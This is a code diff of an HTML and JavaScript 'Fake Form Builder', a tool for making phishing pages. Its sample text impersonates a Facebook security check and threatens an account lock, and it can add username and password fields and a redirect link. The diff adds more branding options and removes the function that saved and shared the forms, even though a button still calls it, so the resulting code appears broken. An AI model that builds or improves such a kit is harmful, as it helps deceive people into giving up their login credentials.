@@ -1,5 +1,4 @@
-<!DOCTYPE html><html>
-<head>
+<!DOCTYPE html><html><head>
   <title>Form Builder</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
@@ -11,15 +10,19 @@
   </style>
 </head>
 <body><div class="container">
-  <h2>🎨 Fake Form Builder</h2><label>Page Title</label> <input id="title" placeholder="e.g. Facebook Security Check">
+  <h2>🎨 Fake Form Builder</h2><label>Page Title</label> <input id="title" placeholder="e.g. Facebook Security Check"> <label>Page Title Color</label> <input type="color" id="titleColor">
 
-<label>Logo Image URL</label> <input id="logo" placeholder="https://...">
+<label>Logo Image URL</label> <input id="logo" placeholder="https://..."> <label>Banner Image URL</label> <input id="banner" placeholder="https://...">
 
 <label>Description</label>
 
   <textarea id="description" placeholder="e.g. Please verify your account."></textarea><label>Warning Message</label>
 
-  <textarea id="warning" placeholder="e.g. ⚠️ Failure to verify may result in account lock!"></textarea><label><input type="checkbox" id="addAuth"> Include Username & Password</label>
+  <textarea id="warning" placeholder="e.g. ⚠️ Failure to verify may result in account lock!"></textarea><label>Warning Color</label> <input type="color" id="warningColor">
+
+<label><input type="checkbox" id="addAuth"> Include Username & Password</label> <label>Username Placeholder</label> <input id="usernamePlaceholder" placeholder="Enter username"> <label>Password Placeholder</label> <input id="passwordPlaceholder" placeholder="Enter password">
+
+<label><input type="checkbox" id="useRedirect"> Enable Redirect Link</label> <input id="redirectLink" placeholder="Enter redirect URL">
 
 <label>Extra Fields (one per line)</label>
 
@@ -27,11 +30,12 @@
 
 <label>Add Field</label> <input id="newField" placeholder="e.g. Code"> <button onclick="addField()">➕ Add Field</button>
 
-  <ul id="fieldsList"></ul><label>Button Text</label> <input id="buttonText" placeholder="e.g. Continue" value="Continue">
+  <ul id="fieldsList"></ul><label>Button Text</label> <input id="buttonText" placeholder="e.g. Continue" value="Continue"> <button onclick="generateForm()">✅ Generate Form</button>
 
-<button onclick="generateForm()">✅ Generate Form</button>
-
-  <div class="preview" id="livePreview"></div>
+  <div class="preview">
+    <strong>Live Preview</strong>
+    <div id="livePreview"></div>
+  </div>
 </div><script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
@@ -83,25 +87,31 @@ function renderFields() {
 function buildPreview() {
   const title = document.getElementById("title").value;
   const logo = document.getElementById("logo").value;
+  const banner = document.getElementById("banner").value;
   const desc = document.getElementById("description").value;
   const warn = document.getElementById("warning").value;
+  const warningColor = document.getElementById("warningColor").value;
   const extras = document.getElementById("extraFields").value.trim().split("\n");
   const showAuth = document.getElementById("addAuth").checked;
   const textColor = document.getElementById("textColor").value;
   const bgColor = document.getElementById("bgColor").value;
   const btnColor = document.getElementById("btnColor").value;
   const buttonText = document.getElementById("buttonText").value || "Submit";
+  const titleColor = document.getElementById("titleColor").value;
+  const usernamePlaceholder = document.getElementById("usernamePlaceholder").value;
+  const passwordPlaceholder = document.getElementById("passwordPlaceholder").value;
 
   let html = `<div style="background:${bgColor};color:${textColor};padding:20px;border-radius:10px;">`;
+  if (banner) html += `<img src="${banner}" style="width:100%;border-radius:8px;margin-bottom:10px;">`;
   if (logo) html += `<img src="${logo}" style="max-width:100px;display:block;margin:auto;">`;
-  if (title) html += `<h2 style="text-align:center;">${title}</h2>`;
+  if (title) html += `<h2 style="text-align:center;color:${titleColor};">${title}</h2>`;
   if (desc) html += `<p style="text-align:center;">${desc}</p>`;
-  if (warn) html += `<p style="color:red;text-align:center;font-weight:bold;">${warn}</p>`;
+  if (warn) html += `<p style="color:${warningColor};text-align:center;font-weight:bold;">${warn}</p>`;
 
   html += `<form>`;
   if (showAuth) {
-    html += `<label>Username</label><input type="text" style="width:100%;"><br>`;
-    html += `<label>Password</label><input type="password" style="width:100%;"><br>`;
+    html += `<label>Username</label><input type="text" placeholder="${usernamePlaceholder}" style="width:100%;"><br>`;
+    html += `<label>Password</label><input type="password" placeholder="${passwordPlaceholder}" style="width:100%;"><br>`;
   }
 
   fields.concat(extras).filter(x => x.trim()).forEach(f => {
@@ -114,32 +124,8 @@ function buildPreview() {
   document.getElementById("livePreview").innerHTML = html;
 }
 
-["title", "logo", "description", "warning", "extraFields", "textColor", "bgColor", "btnColor", "addAuth", "buttonText"]
+["title", "logo", "banner", "description", "warning", "warningColor", "extraFields", "textColor", "bgColor", "btnColor", "addAuth", "buttonText", "titleColor", "usernamePlaceholder", "passwordPlaceholder"]
   .forEach(id => document.getElementById(id).addEventListener("input", buildPreview));
 
-function generateForm() {
-  const formData = {
-    title: document.getElementById("title").value,
-    logo: document.getElementById("logo").value,
-    description: document.getElementById("description").value,
-    warning: document.getElementById("warning").value,
-    fields,
-    extraFields: document.getElementById("extraFields").value.trim().split("\n"),
-    textColor: document.getElementById("textColor").value,
-    bgColor: document.getElementById("bgColor").value,
-    btnColor: document.getElementById("btnColor").value,
-    buttonText: document.getElementById("buttonText").value || "Submit",
-    addAuth: document.getElementById("addAuth").checked,
-    created: Date.now()
-  };
-
-  addDoc(collection(db, "forms"), formData).then(docRef => {
-    const id = docRef.id;
-    alert("✅ Form saved!\nLink: /form.html?id=" + id);
-    location.href = "/forms.html";
-  });
-}
-
 buildPreview();
-</script></body>
-</html>
+</script></body></html>
